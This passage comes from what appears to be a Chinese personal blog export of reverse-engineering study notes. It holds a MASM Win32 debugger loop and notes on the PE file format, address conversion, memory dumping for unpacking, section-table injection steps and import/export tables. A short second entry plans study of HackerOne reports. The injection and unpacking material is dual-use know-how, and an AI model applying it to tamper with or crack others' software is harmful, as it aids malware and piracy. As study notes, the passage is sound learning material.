<h2 id="调试框架"><a href="#调试框架" class="headerlink" title="调试框架"></a>调试框架</h2><p>为什么写汇编代码调用的是 win32的 API？（win32是桌面应用程序的底层接口吗）</p>
<p>事件驱动，消息响应</p>
<p>1、建立调试会话<br>    CreateProcess<br>    DebugActiveProcess<br>2、循环接受调试事件<br>    waitForDebugEvent<br>3、处理调试事件<br>4、提交处理结果<br>    ContinueDebugEvent</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall  ;32 bit memory model</span><br><span class="line">option casemap :none  ;case sensitive</span><br><span class="line"></span><br><span class="line">include DBG.inc</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">	g_szExePath db &quot;winmine.exe&quot;, 0</span><br><span class="line">	g_szEXCEPTION_DEBUG_EVENT 	    db &quot;EXCEPTION_DEBUG_EVENT&quot;, 0dh,0ah,0</span><br><span class="line">	g_szCREATE_THREAD_DEBUG_EVENT   db &quot;CREATE_THREAD_DEBUG_EVENT&quot;,0dh,0ah,0</span><br><span class="line">	g_szCREATE_PROCESS_DEBUG_EVENT db &quot;CREATE_PROCESS_DEBUG_EVENT&quot;,0dh,0ah,0</span><br><span class="line">	g_szEXIT_THREAD_DEBUG_EVENT 	    db &quot;EXIT_THREAD_DEBUG_EVENT&quot;,0dh,0ah,0</span><br><span class="line">	g_szEXIT_PROCESS_DEBUG_EVENT 	    db &quot;EXCEPTION_DEBUG_EVENT&quot;,0dh,0ah,0</span><br><span class="line">	g_szLOAD_DLL_DEBUG_EVENT 	    db &quot;LOAD_DLL_DEBUG_EVENTO&quot;, 0dh,0ah,0</span><br><span class="line">	g_szUNLOAD_DLL_DEBUG_EVENT 	    db &quot;UNLOAD_DLL _DEBUG_EVENT&quot;,0dh,0ah,0</span><br><span class="line">	g_szOUTPUT_DEBUG_STRING_EVENT  db &quot;OUTPUT_DEBUG_STRING_EVENT&quot;,0dh,0ah,0</span><br><span class="line">	</span><br><span class="line">	g_szFmtCreateProcess db &quot;BaseOfImage:%08X, StartAddress:%08X&quot;, 0dh,0ah,&quot;ImageName:%s&quot;,0dh, 0ah, 0</span><br><span class="line">	g_szFmtLoadDlls db &quot;Base0fDll:%08X, ImageName:%s&quot;,0dh,0ah,0</span><br><span class="line">	g_szFmtLoadDllx db &quot;Base0fDll:%08X, ImageName:%08X&quot;,0dh,0ah,0</span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">OnLoadDll proc pDE:ptr DEBUG_EVENT</span><br><span class="line">	LOCAL @dwAddrOfName:DWORD</span><br><span class="line">	LOCAL @hProcess:HANDLE</span><br><span class="line">	LOCAL @dwPid:DWORD</span><br><span class="line">	LOCAL @dwBytesReaded:DWORD</span><br><span class="line">	LOCAL @szwBuf[MAX_PATH]:word</span><br><span class="line">	LOCAL @szBuf[MAX_PATH]:byte</span><br><span class="line"></span><br><span class="line">	mov esi, pDE</span><br><span class="line">	assume esi:ptr DEBUG_EVENT</span><br><span class="line">	mov eax,[esi].dwProcessId</span><br><span class="line">	mov @dwPid, eax</span><br><span class="line">	</span><br><span class="line">	lea esi,[esi].u.LoadDll</span><br><span class="line">	assume esi:ptr LOAD_DLL_DEBUG_INFO</span><br><span class="line">	</span><br><span class="line">	invoke OpenProcess,PROCESS_ALL_ACCESS,FALSE,@dwPid</span><br><span class="line">	.if eax == NULL</span><br><span class="line">		mov eax,DBG_CONTINUE</span><br><span class="line">		ret</span><br><span class="line">	.endif</span><br><span class="line">	mov @hProcess, eax</span><br><span class="line">	</span><br><span class="line">	invoke ReadProcessMemory, @hProcess,[esi]. lpImageName, addr @dwAddrOfName,sizeof @dwAddrOfName,addr @dwBytesReaded</span><br><span class="line">	.if eax == FALSE</span><br><span class="line">		invoke crt_printf, offset g_szFmtLoadDllx, [esi].lpBaseOfDll, [esi].lpImageName</span><br><span class="line">		mov eax,DBG_CONTINUE</span><br><span class="line">		ret</span><br><span class="line">	.endif</span><br><span class="line"> </span><br><span class="line"> 	.if [esi].fUnicode</span><br><span class="line"> 		invoke ReadProcessMemory, @hProcess, @dwAddrOfName, addr @szwBuf, MAX_PATH, addr @dwBytesReaded</span><br><span class="line"> 		invoke WideCharToMultiByte, CP_ACP,0, addr @szwBuf, MAX_PATH, addr @szBuf,MAX_PATH, NULL, NULL</span><br><span class="line"> 	.else</span><br><span class="line"> 		invoke ReadProcessMemory,@hProcess, @dwAddrOfName, addr @szBuf, MAX_PATH, addr @dwBytesReaded</span><br><span class="line"> 	.endif</span><br><span class="line">	</span><br><span class="line">	invoke crt_printf, offset g_szFmtLoadDlls, [esi].lpBaseOfDll, addr @szBuf</span><br><span class="line">	</span><br><span class="line">	assume esi:nothing</span><br><span class="line">	</span><br><span class="line">	mov eax,DBG_CONTINUE</span><br><span class="line">	</span><br><span class="line">	ret</span><br><span class="line">OnLoadDll endp</span><br><span class="line"></span><br><span class="line">OnCreateProcess proc pDE:ptr DEBUG_EVENT</span><br><span class="line">	mov esi, pDE</span><br><span class="line">	assume esi:ptr DEBUG_EVENT</span><br><span class="line">	lea esi,[esi].u.CreateProcessInfo</span><br><span class="line">	assume esi:ptr CREATE_PROCESS_DEBUG_INFO</span><br><span class="line"></span><br><span class="line">	invoke crt_printf, offset g_szCREATE_PROCESS_DEBUG_EVENT</span><br><span class="line">	invoke crt_printf,offset g_szFmtCreateProcess,[esi].lpBaseOfImage,[esi].lpStartAddress,[esi].lpImageName</span><br><span class="line">	</span><br><span class="line">	assume esi:nothing	</span><br><span class="line">	</span><br><span class="line">	mov eax, DBG_CONTINUE</span><br><span class="line">	ret</span><br><span class="line">OnCreateProcess endp</span><br><span class="line"></span><br><span class="line">main proc</span><br><span class="line">	LOCAL @si:STARTUPINFO</span><br><span class="line">	LOCAL @pi:PROCESS_INFORMATION</span><br><span class="line">	LOCAL @de:DEBUG_EVENT</span><br><span class="line">	LOCAL @dwContinueStatus:DWORD</span><br><span class="line">	</span><br><span class="line">	invoke RtlZeroMemory,addr @si,sizeof @si</span><br><span class="line">	invoke RtlZeroMemory,addr @pi,sizeof @pi</span><br><span class="line">	</span><br><span class="line">	mov @si. cb, sizeof @si</span><br><span class="line">	</span><br><span class="line">	mov @dwContinueStatus, DBG_CONTINUE</span><br><span class="line"></span><br><span class="line">	;建立调试会话</span><br><span class="line">	invoke CreateProcess,offset g_szExePath, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, addr @si, addr @pi</span><br><span class="line">	.if eax == FALSE </span><br><span class="line">		ret</span><br><span class="line">	.endif</span><br><span class="line"></span><br><span class="line">	.while TRUE</span><br><span class="line">		invoke WaitForDebugEvent,addr @de,INFINITE</span><br><span class="line">		.if eax == FALSE</span><br><span class="line">			.continue</span><br><span class="line">		.endif</span><br><span class="line">		</span><br><span class="line">		.if @de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT</span><br><span class="line">			invoke crt_printf,offset g_szEXCEPTION_DEBUG_EVENT</span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">		.elseif @de.dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT</span><br><span class="line">			invoke crt_printf, offset g_szCREATE_THREAD_DEBUG_EVENT</span><br><span class="line">			</span><br><span class="line">		.elseif @de.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT</span><br><span class="line">			invoke OnCreateProcess, addr @de</span><br><span class="line">			mov @dwContinueStatus, eax</span><br><span class="line">			</span><br><span class="line">		.elseif @de.dwDebugEventCode == EXIT_THREAD_DEBUG_EVENT</span><br><span class="line">			invoke crt_printf, offset g_szEXIT_THREAD_DEBUG_EVENT</span><br><span class="line">			</span><br><span class="line">		.elseif @de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT</span><br><span class="line">			invoke crt_printf, offset g_szEXIT_PROCESS_DEBUG_EVENT</span><br><span class="line">			</span><br><span class="line">		.elseif @de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT</span><br><span class="line">			;invoke crt_printf, offset g_szLOAD_DLL_DEBUG_EVENT</span><br><span class="line">			invoke OnLoadDll, addr @de</span><br><span class="line">			mov @dwContinueStatus, eax </span><br><span class="line">			</span><br><span class="line">		.elseif @de.dwDebugEventCode == UNLOAD_DLL_DEBUG_EVENT</span><br><span class="line">			invoke crt_printf, offset g_szUNLOAD_DLL_DEBUG_EVENT</span><br><span class="line">			</span><br><span class="line">		.elseif @de.dwDebugEventCode == OUTPUT_DEBUG_STRING_EVENT</span><br><span class="line">			invoke crt_printf, offset g_szOUTPUT_DEBUG_STRING_EVENT</span><br><span class="line">		.endif</span><br><span class="line">		;没这行就GG</span><br><span class="line">		invoke ContinueDebugEvent, @de.dwProcessId, @de.dwThreadId, @dwContinueStatus</span><br><span class="line">	.endw</span><br><span class="line">	xor eax, eax</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">	invoke main</span><br><span class="line">	xor eax,eax</span><br><span class="line">	invoke ExitProcess,0</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h2 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">#修改对齐值</span><br><span class="line">ml /c /coff pe.asm</span><br><span class="line">link /merge:.rdata=.text /align:<span class="number">16</span> /subsystem:windows user32.lib kernel32.lib pe.obj</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">IMAGE_DOS_HEADER</span></span><br><span class="line"><span class="comment">IMAGE_NT_HEADERS  32位真正头的偏移</span></span><br><span class="line"><span class="comment">    IMAGE_FILE_HEADER</span></span><br><span class="line"><span class="comment">    IMAGE_OPTIONAL_HEADER</span></span><br><span class="line"><span class="comment">    	IMAGE_DATA_DIRECTORY[1]</span></span><br><span class="line"><span class="comment">IMAGE_SECTION_HEADER[1]  文件映射 选项头的地址 + 选项头的大小 = 节表的位置</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/59.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/60.png" class title="This is an example image">

<p>其他都是16位残留</p>
<p>30 word + long &#x3D; 64字节</p>
<img src="/2024/02/22/Notes-Decompile/61.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/62.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/63.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/64.png" class title="This is an example image">

<p>IMAGE_SECTION_HEADER文件映射 选项头的地址 + 选项头的大小 &#x3D; 节表的位置</p>
<img src="/2024/02/22/Notes-Decompile/65.png" class title="This is an example image">

<ul>
<li>从文件偏移(位置)，映射数据(大小)，到内存地址，在内存中所占大小</li>
<li>节表位置：NT的选项头之后，选项头的地址+选项头大小。就是.text之类的</li>
<li>节大小：两行半&#x3D;16*2+8，union大小为最大元素</li>
<li>文件对齐和内存对齐不一致导致加载后地址偏移</li>
</ul>
<p>winhex查看exe，od查看内存对比</p>
<p>规律：节与节是连续的</p>
<p>要求：PointerToRawData 和 sizeofRawData 都是跟 FileAlign 对齐，virtualAddress是跟 SectionAlign 对齐</p>
<p>sizeofImage：各节内存大小+PE头内存大小；最后一个节的virtualAddress+最后一个节的内存大小</p>
<img src="/2024/02/22/Notes-Decompile/Portable_Executable_32_bit_Structure_in_SVG_fixed.svg" class title="This is an example image">

<h3 id="地址转换"><a href="#地址转换" class="headerlink" title="地址转换"></a>地址转换</h3><p>VA - virtual Address，内存中的虚拟地址，绝对地址</p>
<p>RVA - relative virtual address，相对虚拟地址，相对于模块基址的偏移</p>
<p>FA - file address，文件偏移，文件中所在的地址</p>
<table>
<thead>
<tr>
<th>virtualsize</th>
<th>virtualAddress</th>
<th>SizeofRawData</th>
<th>PointerToRawData</th>
</tr>
</thead>
<tbody><tr>
<td>0x28</td>
<td>0x1000</td>
<td>0x200</td>
<td>0x400</td>
</tr>
<tr>
<td>0x92</td>
<td>0x2000</td>
<td>0x200</td>
<td>0x600</td>
</tr>
<tr>
<td>0x10</td>
<td>0x3000</td>
<td>0x200</td>
<td>0x800</td>
</tr>
<tr>
<td>0x10</td>
<td>0x4000</td>
<td>0x200</td>
<td>0xa00</td>
</tr>
</tbody></table>
<p>00402145(VA) –&gt; 2145(RVA) –&gt; 145 + 600 –&gt; 745(FA)</p>
<p>812(FA) –&gt; 12 + 3000 -&gt; 3012 + 00400000 –&gt; 00403012(VA)</p>
<p>程序中的绝对地址映射到内存中的地址</p>
<p>修改winhex的745地址值，OD里的内存中00402145的改变</p>
<table>
<thead>
<tr>
<th>virtualsize</th>
<th>virtualAddress</th>
<th>SizeofRawData</th>
<th>PointerToRawData</th>
</tr>
</thead>
<tbody><tr>
<td>0xBA</td>
<td>0x210</td>
<td>0xC0</td>
<td>0x210</td>
</tr>
<tr>
<td>0x10</td>
<td>0x2D0</td>
<td>0x10</td>
<td>0x2D0</td>
</tr>
</tbody></table>
<p>从文件偏移 0x2D0 处复制 0x10 个字节的数据到内存 0x2D0处，占0x10</p>
<p>00400000 + 210 &#x3D; 00400210</p>
<p>00400000 + 2D0 &#x3D; 004002D0</p>
<img src="/2024/02/22/Notes-Decompile/66.png" class title="This is an example image">



<h3 id="dump文件的编写"><a href="#dump文件的编写" class="headerlink" title="dump文件的编写"></a>dump文件的编写</h3><p>PE头相同，把内存和文件偏移的赋值位置调换</p>
<p>dump是读取内存数据？运行时从文件内映射到内存，dump是从内存映射到文件？</p>
<p>默认还是按照从文件中拿数据映射到内存，把映射地址调换，exe运行机制又没改变？<br>    运行程序，再用winhex打开，看此时的运行内存，即文件偏移复制到内存中的地址<br>    把复制在内存中的节数据拷贝到新的exe</p>
<ul>
<li>生成dump文件可能会因为全局变量初始化问题出问题</li>
<li>dump未初始化的文件</li>
</ul>
<p>解答：</p>
<ul>
<li><strong>映射：按照节表的内容，将PE文件按照节表信息和节数据依次映射进入内存。</strong></li>
<li><strong>DUMP：将内存中的数据按节表数据将目标数据拷贝出来成为一个PE.exe文件</strong></li>
<li><strong>dump的先决条件</strong>：<strong>在OEP处dump</strong>，此时全局变量里的值未被初始化，不会存在全局变量的访问异常。</li>
</ul>
<p>调试器默认都有dump功能</p>
<p>脱壳用dump</p>
<h3 id="节表注入"><a href="#节表注入" class="headerlink" title="节表注入"></a>节表注入</h3><p>添加节</p>
<ol>
<li>节表添加一项</li>
<li>添加节数据</li>
<li>节表个数增1</li>
<li>修改SizeOfImage</li>
</ol>
<p>扩展最后一个节</p>
<ol>
<li>修改节表</li>
<li>添加节数据</li>
<li>修改SizeOfImage</li>
</ol>
<p>CFF工具可以辅助</p>
<h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><img src="/2024/02/22/Notes-Decompile/67.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/68.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/69.png" class title="This is an example image">

<p>IMAGE_DATA_DIRECTORY </p>
<ul>
<li>CFF Explorer，自带地址转换</li>
<li>Dependency Walker</li>
<li>DLL文件占20个字节，1行+4</li>
<li>节表往上8行就是导入表</li>
<li>PE往下7行半就是导出表、导入表</li>
<li>导入表20个字节</li>
</ul>
<img src="/2024/02/22/Notes-Decompile/70.png" class title="This is an example image">

<p>415c - 4000 + 5000 &#x3D; 515c</p>
<p><a href="https://www.cnblogs.com/iBinary/p/9740757.html">https://www.cnblogs.com/iBinary/p/9740757.html</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;		   <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA) 指向IAT结构注释表明了</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 时间戳.</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">// in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders 导入名称？</span></span><br><span class="line">    DWORD   Name;　　　　　　　　　　　　　　　<span class="comment">//指向DLL名字的 RVA</span></span><br><span class="line">    DWORD   FirstThunk;        <span class="comment">// RVA to IAT (if bound this IAT has actual addresses) 导入地址？</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p>可选头后的导入表（地址RVA、大小）跳转导入列表 IMAGE_IMPORT_DESCRIPTOR，每个导入表五个字节。</p>
<p>重点关注第一个(OriginalFirstThunk&#x2F;INT)、第四个(Name)、最后一个(FirstThunk&#x2F;IAT)</p>
<ul>
<li>如果高位位1，说明是序号导入，低WORD 位导入函数的序号值。</li>
<li>如果最高位为 0，说明是名字导入，该DWORD 指向结构体 IMAGE_IMPORT_BY_NAME</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>

<p>IAT 和 INT都指向 IMAGE_THUNK_DATA32，分别指向 Ordinal 和 AddressOfData，它们再指向IMAGE_IMPORT_BY_NAME</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;                 <span class="comment">//编译器决定,不是空的话,就是函数在导出表中的 函数地址表的导出索引.</span></span><br><span class="line">    CHAR   Name[<span class="number">1</span>];               <span class="comment">//函数名称,0结尾.</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>

<p>PE加载到进程之前</p>
<img src="/2024/02/22/Notes-Decompile/75.png" class title="This is an example image">

<p>PE加载到进程之后</p>
<img src="/2024/02/22/Notes-Decompile/71.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/72.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/73.png" class title="This is an example image">

<p>415C(RVA)  - 1000 + 400 &#x3D; 355c(FOA)</p>
<p>4484(RVA)  - 1000 + 400 &#x3D; 3884(FOA)</p>
<p> 直接内存里面看</p>
<img src="/2024/02/22/Notes-Decompile/74.png" class title="This is an example image">

<p>PEload</p>
<p><a href="https://www.52pojie.cn//thread-1077397-1-1.html">https://www.52pojie.cn//thread-1077397-1-1.html</a></p>
<h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;    <span class="comment">// 不加红的不重要</span></span><br><span class="line">    DWORD   TimeDateStamp;      <span class="comment">//时间戳.  编译的时间. 把秒转为时间.可以知道这个DLL是什么时候编译出来的.</span></span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;　　　　　　　　　　　<span class="comment">//指向该导出表文件名的字符串,也就是这个DLL的名称  辅助信息.修改不影响  存储的RVA 如果想在文件中查看.自己计算一下FOA即可.</span></span><br><span class="line">    DWORD   Base; 　　　　　　　　　　<span class="comment">// 导出函数的起始序号</span></span><br><span class="line">    DWORD   NumberOfFunctions;     <span class="comment">//所有的导出函数的个数</span></span><br><span class="line">    DWORD   NumberOfNames;         <span class="comment">//以名字导出的函数的个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// 导出的函数地址的 地址表  RVA  也就是 函数地址表  </span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// 导出的函数名称表的  RVA      也就是 函数名称表</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// 导出函数序号表的RVA         也就是 函数序号表</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/iBinary/p/9739031.html">https://www.cnblogs.com/iBinary/p/9739031.html</a></p>
<p><a href="https://bbs.kanxue.com/thread-269947.htm">https://bbs.kanxue.com/thread-269947.htm</a></p>
<p><a href="https://github.com/DonaldTrump0/LordPE/releases/tag/0.2Soblesky.2">https://github.com/DonaldTrump0/LordPE/releases/tag/0.2Soblesky.2</a></p>
<h3 id="基地重定向表"><a href="#基地重定向表" class="headerlink" title="基地重定向表"></a>基地重定向表</h3><p>IMAGE_BASE_RELOCATION</p>
<p>分页地址，页面偏移 -8&#x2F;2&#x3D;word的个数</p>
<p>API模拟：把dll的接口复制在新内存，调用新内存里的接口</p>
<h3 id="TLS表"><a href="#TLS表" class="headerlink" title="TLS表"></a>TLS表</h3><p>thread local storage 线程局部存储</p>
<p>显示TLS</p>
<ul>
<li>线程 API</li>
</ul>
<p>隐式TLS</p>
<ul>
<li>变量</li>
</ul>
<h3 id="资源表"><a href="#资源表" class="headerlink" title="资源表"></a>资源表</h3><p>函数转发</p>
<p>Import REConstructor</p>
]]></content>
      <categories>
        <category>x队</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>立个长期的flag</title>
    <url>/2023/08/10/%E7%AB%8B%E4%B8%AA%E9%95%BF%E6%9C%9F%E7%9A%84flag/</url>
    <content><![CDATA[<p>2023-08-10</p>
<p><a href="https://hackerone.com/hacktivity/overview">https://hackerone.com/hacktivity/overview</a></p>
<p>把 hackone 上面所有的文章全部学习</p>
<p>拼一把会死的话就去死吧</p>
<hr>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th>描述</th>
<th>链接</th>
</tr>
</thead>
<tbody><tr>
<td align="left">越权&#x2F;信息泄露</td>
<td>在已下订单新添加商品，可替换url中订单号添加到其他用户订单中，返回信息中包括</td>
<td><a href="https://hackerone.com/reports/1903322">https://hackerone.com/reports/1903322</a></td>
</tr>
<tr>
<td align="left"></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"></td>
<td></td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>作死</tag>
      </tags>
  </entry>
</search>
